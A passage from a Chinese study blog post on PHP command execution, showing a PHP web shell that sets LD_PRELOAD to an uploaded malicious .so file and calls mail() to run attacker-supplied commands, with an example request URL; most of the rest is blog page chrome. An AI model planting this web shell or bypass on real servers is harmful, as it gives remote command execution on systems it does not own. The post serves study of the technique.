+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];  <span class="comment">//要执行的系统命令cmd</span></span><br><span class="line"><span class="variable">$out_path</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;outpath&quot;</span>];  <span class="comment">//outpath命令执行结果输出到指定路径下的文件</span></span><br><span class="line"><span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span>.<span class="string">&quot; &gt; &quot;</span>.<span class="variable">$out_path</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>;  <span class="comment">//2&gt;&amp;1将标准错误重新定向到标准输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;cmdline: &lt;/b&gt;&quot;</span>.<span class="variable">$evil_cmdline</span>;  <span class="comment">//打印显示实际在linux上执行的命令</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span>.<span class="variable">$evil_cmdline</span>);  <span class="comment">//将执行的命令配置成系统环境变量EVIL_CMDLINE</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$so_path</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;sopath&quot;</span>];  <span class="comment">//sopath传入.so文件</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span>.<span class="variable">$so_path</span>);  <span class="comment">//将.so文件路径配置成系统环境变量LD_PRELOAD</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;output: &lt;/b&gt;&lt;/br&gt;&quot;</span>.<span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>));  <span class="comment">//echo把内容在网页上显示出来</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>同样上传demo.php和恶意动态链接库demo.so</em></p>
+<blockquote>
+<p>访问<a target="_blank" rel="noopener" href="http://x.x.x.x8081/.../demo.php?cmd=ls&outpath=/tmp/benben&sopath=./demo.so">http://x.x.x.x8081/.../demo.php?cmd=ls&amp;outpath=/tmp/benben&amp;sopath=./demo.so</a></p>
+<ul>
+<li><code>cmd</code>执行的命令（可控）</li>
+<li><code>out_path</code>输出的路径</li>
+<li><code>sopath</code>指定恶意动态链接库</li>
+</ul>
+</blockquote>
+<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p>继续学习<a href="https://garlic-dove.github.io/2026/01/19/php%E5%91%BD%E4%BB%A42/">简单的php命令（二）</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://garlic-dove.github.io">Garlic-dove</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://garlic-dove.github.io/2025/12/14/php%E5%91%BD%E4%BB%A41/">https://garlic-dove.github.io/2025/12/14/php命令1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://garlic-dove.github.io" target="_blank">蒜鸟的鸟巢</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/php/">php</a></div><div class="post-share"><div class="social-share" data-image="/image/2.avif" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>投喂蒜鸟</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/image/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/image/wechat.jpg" alt="感谢投喂！"/ loading='lazy'></a><div class="post-qr-code-desc">感谢投喂！</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/19/php%E5%91%BD%E4%BB%A42/" title="简单的php命令（二）"><img class="cover" src="/image/20.avif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post" loading='lazy'><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">简单的php命令（二）</div></div><div class="info-2"><div class="info-item-1">继续简单学点php命令执行</div></div></div></a><a class="pagination-related" href="/2025/11/20/%E8%AE%A4%E8%AF%86Web/" title="对Web的初次攻略"><img class="cover" src="/image/9.avif" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">对Web的初次攻略</div></div><div class="info-2"><div class="info-item-1">菜鸟的日常罢了</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/01/19/php%E5%91%BD%E4%BB%A42/" title="简单的php命令（二）"><img class="cover" src="/image/20.avif" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-19</div><div class="info-item-2">简单的php命令（二）</div></div><div class="info-2"><div class="info-item-1">继续简单学点php命令执行</div></div></div></a><a class="pagination-related" href="/2025/10/26/blender%E5%82%BB%E9%B8%9F%E7%AC%94%E8%AE%B01/" title="蒜鸟的blender，基本快捷键"><img class="cover" src="https://www.xue8nav.com/wp-content/uploads/how-to-learn-blender.png" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-26</div><div class="info-item-2">蒜鸟的blender，基本快捷键</div></div><div class="info-2"><div class="info-item-1">第一天：Blender是一款好玩的游戏</div></div></div></a><a class="pagination-related" href="/2025/11/10/blender%E5%82%BB%E9%B8%9F%E7%AC%94%E8%AE%B02/" title="蒜鸟的blender，奇妙的编辑"><img class="cover" src="https://store-images.s-microsoft.com/image/apps.40089.13546604597911677.4d22b406-abea-478f-a927-e2687ad6bed3.69c3e902-379e-4db7-9cdc-aa7d835f9151?mode=scale&q=90&h=1080&w=1920" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-10</div><div class="info-item-2">蒜鸟的blender，奇妙的编辑</div></div><div class="info-2"><div class="info-item-1">第二天：玩游戏就玩Blender</div></div></div></a><a class="pagination-related" href="/2025/11/20/%E8%AE%A4%E8%AF%86Web/" title="对Web的初次攻略"><img class="cover" src="/image/9.avif" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-20</div><div class="info-item-2">对Web的初次攻略</div></div><div class="info-2"><div class="info-item-1">菜鸟的日常罢了</div></div></div></a><a class="pagination-related" href="/2025/11/03/%E5%92%8CWeb%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/" title="和Web的初次邂逅"><img class="cover" src="/image/6.avif" alt="cover" loading='lazy'><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-03</div><div class="info-item-2">和Web的初次邂逅</div></div><div class="info-2"><div class="info-item-1">虽然什么也不懂，但是记了很多</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/gg.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">Garlic-dove</div><div class="author-info-description">味大的鸽子</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Garlic-dove/Garlic-dove.github.io"><i class="fab fa-github"></i><span>我的 Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="mailto:m19229112452@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><img src="/image/9.jpg" style="height:17em; vertical-align:middle;" loading='lazy'> <strong><img src="/image/10.jpg" style="height:14em; vertical-align:middle;" loading='lazy'> <strong>平平无奇的一只鸟和他味大的鸟窝</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">php中的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">常见的危险函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LD-PRELOAD%E9%A5%B6%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">LD_PRELOAD饶过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%93%BE%E6%8E%A5"><span class="toc-number">2.1.</span> <span class="toc-text">程序的链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mail-%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">mail()函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD"><span class="toc-number">3.</span> <span class="toc-text">未完待续</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/19/php%E5%91%BD%E4%BB%A42/" title="简单的php命令（二）"><img src="/image/20.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="简单的php命令（二）"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/01/19/php%E5%91%BD%E4%BB%A42/" title="简单的php命令（二）">简单的php命令（二）</a><time datetime="2026-01-19T12:27:15.000Z" title="发表于 2026-01-19 20:27:15">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/14/php%E5%91%BD%E4%BB%A41/" title="简单的php命令（一）"><img src="/image/2.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="简单的php命令（一）"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/12/14/php%E5%91%BD%E4%BB%A41/" title="简单的php命令（一）">简单的php命令（一）</a><time datetime="2025-12-14T13:57:58.000Z" title="发表于 2025-12-14 21:57:58">2025-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/20/%E8%AE%A4%E8%AF%86Web/" title="对Web的初次攻略"><img src="/image/9.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="对Web的初次攻略"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/11/20/%E8%AE%A4%E8%AF%86Web/" title="对Web的初次攻略">对Web的初次攻略</a><time datetime="2025-11-20T14:51:54.000Z" title="发表于 2025-11-20 22:51:54">2025-11-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/10/blender%E5%82%BB%E9%B8%9F%E7%AC%94%E8%AE%B02/" title="蒜鸟的blender，奇妙的编辑"><img src="https://store-images.s-microsoft.com/image/apps.40089.13546604597911677.4d22b406-abea-478f-a927-e2687ad6bed3.69c3e902-379e-4db7-9cdc-aa7d835f9151?mode=scale&amp;q=90&amp;h=1080&amp;w=1920" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蒜鸟的blender，奇妙的编辑"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/11/10/blender%E5%82%BB%E9%B8%9F%E7%AC%94%E8%AE%B02/" title="蒜鸟的blender，奇妙的编辑">蒜鸟的blender，奇妙的编辑</a><time datetime="2025-11-10T13:31:24.000Z" title="发表于 2025-11-10 21:31:24">2025-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/03/%E5%92%8CWeb%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/" title="和Web的初次邂逅"><img src="/image/6.avif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="和Web的初次邂逅"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/11/03/%E5%92%8CWeb%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/" title="和Web的初次邂逅">和Web的初次邂逅</a><time datetime="2025-11-03T08:24:39.000Z" title="发表于 2025-11-03 16:24:39">2025-11-03</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Garlic-dove</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="9605021877" data-server="tencent" data-type="playlist" data-fixed="true" data-autoplay="true" data-lrcType="-1"> </div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: true,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      true
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.1"></script></div></div></body></html>
